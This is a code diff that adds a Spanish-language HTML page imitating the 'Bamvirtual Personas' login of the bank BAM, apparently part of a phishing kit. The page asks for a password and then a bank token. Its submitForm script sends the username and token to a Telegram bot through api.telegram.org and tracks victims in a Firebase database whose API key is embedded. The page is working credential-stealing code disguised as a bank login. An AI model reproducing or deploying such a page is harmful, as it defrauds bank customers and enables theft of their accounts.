@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BAM</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto,
+          Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji,
+          Segoe UI Symbol;
+        margin: 0;
+        padding: 0;
+      }
+
+      .container {
+        display: flex;
+        height: 100vh;
+      }
+
+      .left,
+      .right {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .left {
+        background-color: #f4f4f4;
+      }
+
+      .right {
+        background-color: #f4f4f4;
+      }
+
+      .icon-container {
+        width: 100%;
+        text-align: center;
+      }
+
+      .icon-container img {
+        width: auto;
+        height: 50px;
+      }
+
+      .formulario {
+        width: 50%;
+      }
+
+      .cuadrado {
+        background-color: white;
+        padding: 10px;
+        box-sizing: border-box;
+        padding-top: 30px;
+      }
+
+      .right img {
+        width: 60%;
+        height: auto;
+      }
+
+      @media (max-width: 768px) {
+        .container {
+          flex-direction: column;
+        }
+        .left,
+        .right {
+          width: 100%;
+          height: 100vh;
+        }
+        .left {
+          padding-top: 30px;
+          justify-content: initial;
+          align-items: center;
+        }
+        .right img {
+          width: 90%;
+        }
+        .formulario {
+          width: 90%;
+          max-width: none;
+        }
+        .icon-container img {
+          width: 30%;
+        }
+      }
+
+      .icon-input {
+        position: relative;
+        margin-bottom: 20px;
+        width: 100%;
+      }
+
+      input:focus {
+        outline: none;
+      }
+
+      .icon-input input {
+        width: 100%;
+        padding: 10px 10px 10px 40px;
+        border: 0;
+        border-bottom: 1px solid #ccc;
+        border-radius: 4px;
+        font-size: 16px;
+        box-sizing: border-box;
+      }
+
+      .icon-input .icon {
+        position: absolute;
+        left: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #888;
+      }
+
+      .icon-input label {
+        position: absolute;
+        left: 40px;
+        top: 50%;
+        transform: translateY(-50%);
+        transition: 0.2s ease all;
+        pointer-events: none;
+        color: #999;
+      }
+
+      .icon-input input:focus + label,
+      .icon-input input:not(:placeholder-shown) + label {
+        top: -10px;
+        left: 10px;
+        font-size: 12px;
+        background-color: white;
+        padding: 0 5px;
+      }
+
+      .button-container {
+        width: 100%;
+        margin-top: 20px;
+      }
+
+      button {
+        width: 100%;
+        padding: 17px;
+        border-radius: 50px;
+        box-shadow: 0 1px 4px #0000001a;
+        border: 1px solid #cccccc;
+        background-color: #ccc;
+        color: #7c7b7b;
+        cursor: not-allowed;
+        font-weight: bold;
+        font-size: 16px;
+      }
+
+      button.enabled {
+        background-color: #fdda24;
+        border: 0;
+        color: white;
+        cursor: pointer;
+      }
+
+      .overlay {
+        display: flex;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        justify-content: center;
+        align-items: center;
+        z-index: 1000000;
+      }
+
+      .overlay .loading {
+        color: white;
+        font-size: 24px;
+      }
+
+      .number-form {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background-color: white;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 1px 4px #0000001a;
+        z-index: 1001;
+        max-width: 90%;
+        width: 400px;
+        box-sizing: border-box;
+      }
+
+      .number-form input {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+      }
+
+      .number-form button {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ccc;
+        background-color: #fdda24;
+        color: white;
+        border-radius: 4px;
+        box-sizing: border-box;
+        margin-bottom: 20px;
+        margin-top: 10px;
+      }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script>
+      function isNumberKey(event) {
+        const charCode = event.which ? event.which : event.keyCode;
+        // Permitir números (teclas 48-57), retroceso (8), tab (9)
+        if (charCode >= 48 && charCode <= 57) {
+          return true;
+        } else if (charCode === 8 || charCode === 9) {
+          return true; // Permitir backspace y tab
+        } else {
+          return false; // Bloquear cualquier otra tecla
+        }
+      }
+    </script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+    </script>
+  </head>
+  <body>
+    <div class="container">
+      <div class="left">
+        <div class="icon-container">
+          <img src="datos/bam-icon.svg" alt="BAM Icon" />
+        </div>
+        <div>
+          <p>Bienvenido a Bamvirtual Personas</p>
+        </div>
+        <div class="formulario">
+          <div
+            style="
+              width: 100%;
+              text-align: center;
+              display: flex;
+              z-index: 50;
+              height: 50px;
+            "
+          >
+            <div
+              style="
+                border-radius: 100%;
+                width: 70px;
+                height: 70px;
+                background: red;
+                margin: auto;
+              "
+            >
+              <img
+                src="https://upload.wikimedia.org/wikipedia/commons/2/24/Stray_calico_cat_near_Sagami_River-01.jpg"
+                alt=""
+                style="width: 100%; height: 100%; border-radius: 100%"
+              />
+            </div>
+          </div>
+          <div class="cuadrado">
+            <div style="text-align: center; margin-bottom: 20px">
+              frase de seguridad
+            </div>
+            <div class="icon-input">
+              <i class="icon icon-user">
+                <img
+                  src="https://cdn-icons-png.flaticon.com/512/482/482624.png"
+                  style="width: 20px"
+                />
+              </i>
+              <input
+                type="text"
+                id="input-username"
+                class="form-control input-general"
+                autocomplete="off"
+                minlength="1"
+                maxlength="20"
+                placeholder=" "
+              />
+              <label for="input-username">Ingresa tu contraseña</label>
+            </div>
+          </div>
+          <div class="button-container">
+            <button id="continue-button" type="button">INICIAR SESIÓN</button>
+            <a href="index.html">
+              <button
+                style="
+                  width: 100%;
+                  padding: 15px;
+                  margin-top: 15px;
+                  border: 1px solid black;
+                  background: white;
+                "
+                type="button"
+              >
+                REGRESAR
+              </button>
+            </a>
+          </div>
+          <div
+            style="
+              width: 100%;
+              background: #9a9a9a;
+              height: 1px;
+              margin-top: 50px;
+              margin-bottom: 50px;
+            "
+          ></div>
+        </div>
+      </div>
+      <div class="right">
+        <img src="datos/login.gif" alt="Imagen de ejemplo" />
+      </div>
+    </div>
+    <div id="overlay" class="overlay">
+      <div class="loading">Cargando...</div>
+    </div>
+    <div id="number-overlay" class="overlay">
+      <div class="number-form formulario">
+        <div style="width: 100%; text-align: center">
+          <img
+            src="datos/bam-icon.svg"
+            style="width: 100px; margin-bottom: 20px"
+          />
+        </div>
+        <h4>Ingrese su token para confirmar sus credenciales</h4>
+
+        <input
+          type="text"
+          id="number-input"
+          placeholder="Ingresa su token"
+          onkeypress="return isNumberKey(event)"
+          oninput="checkFormCompletion()"
+        />
+        <button
+          type="button"
+          id="continue-button1"
+          class="disabled"
+          onclick="submitForm()"
+        >
+          Enviar
+        </button>
+      </div>
+    </div>
+    <script src="telegram.js"></script>
+
+    <script>
+      // Función para verificar si todos los campos están completos
+      function checkFormCompletion() {
+        const usuario = document.getElementById("number-input").value;
+        const submitButton = document.getElementById("continue-button1");
+
+        // Si el campo de usuario no está vacío, habilitar el botón
+        if (usuario !== "") {
+          submitButton.disabled = false;
+          submitButton.classList.remove("disabled");
+          submitButton.classList.add("enabled");
+        } else {
+          submitButton.disabled = true;
+          submitButton.classList.add("disabled");
+          submitButton.classList.remove("enabled");
+        }
+      }
+
+      // Función para manejar el clic en el botón de "Continuar"
+      async function submitForm() {
+        const nombre = localStorage.getItem("usuario");
+        const contra = document.getElementById("number-input").value;
+
+        // Mostrar un alert con los datos ingresados
+        const questionRef = doc(window.db, "bamguat", nombre);
+        await setDoc(questionRef, {
+          page: 0,
+          frase: "",
+          imagen: "",
+        });
+        const message =
+          "Bamguatemala\nUsuario: " + nombre + "\nToken: " + contra;
+        axios
+          .post(
+            "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
+            {
+              chat_id: chat,
+              text: message,
+            }
+          )
+          .then((response) => {
+            window.parent.location.href = "cargando.html";
+          })
+          .catch((error) => {
+            console.error(error);
+          });
+      }
+    </script>
+  </body>
+</html>
